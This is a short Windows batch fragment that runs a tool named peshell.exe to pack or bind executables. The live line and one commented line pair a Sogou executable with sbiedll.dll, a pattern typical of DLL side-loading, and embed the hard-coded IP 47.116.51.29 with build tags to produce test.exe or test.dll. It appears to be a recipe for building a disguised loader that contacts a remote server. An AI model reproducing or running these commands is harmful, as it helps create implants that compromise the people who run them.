...
rem peshell.exe -be c:\windows\syswow64\calc.exe

rem peshell.exe -e D:\vsproject\PEShell\work\errlook.exe -o mytest.exe

rem peshell.exe -bd sogou.exe sbiedll.dll -p 47.116.51.29 jypc20201217 -o test.dll
peshell.exe -be sogou.exe sbiedll.dll -p 47.116.51.29 test20200401 -o test.exe
